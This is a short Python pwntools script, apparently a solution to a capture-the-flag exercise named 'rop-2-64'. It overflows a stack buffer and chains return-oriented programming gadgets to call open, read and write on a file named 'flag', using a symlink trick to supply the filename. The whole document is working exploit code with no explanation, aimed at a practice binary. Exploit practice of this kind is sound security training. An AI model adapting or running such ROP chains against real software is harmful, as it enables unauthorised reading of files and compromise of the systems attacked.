#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-64")

'''
0x00000000004004d0  write@plt
0x00000000004004e0  printf@plt
0x00000000004004f0  read@plt
0x0000000000400510  open@plt
'''

openfile = p64(0x400510)
readfile = p64(0x4004f0)
writefile = p64(0x4004d0)

'''
0x0000000000400743 : pop rdi ; ret
0x0000000000400668 : pop rdx ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
'''

pop_rdi_ret = p64(0x400743)
pop_rdx_ret = p64(0x400668)
pop_rsi_r15_ret = p64(0x400741)

buf = "A" * 0x80 + "B" * 8

string = p64(0x400682)

if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("flag","\x01");

#  open("flag", 0, 0);
buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(0)
buf += openfile

# read(3, buffer, 100)
buf += pop_rdi_ret
buf += p64(3)
buf += pop_rsi_r15_ret
buf += p64(0x601800)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(100)
buf += readfile

# write(1, buffer, 100)
buf += pop_rdi_ret
buf += p64(1)
buf += pop_rsi_r15_ret
buf += p64(0x601800)
buf += p64(0)
buf += pop_rdx_ret
buf += p64(100)
buf += writefile

with open('test','wb')as f:
      f.write(buf);

p.sendline(buf)
p.interactive()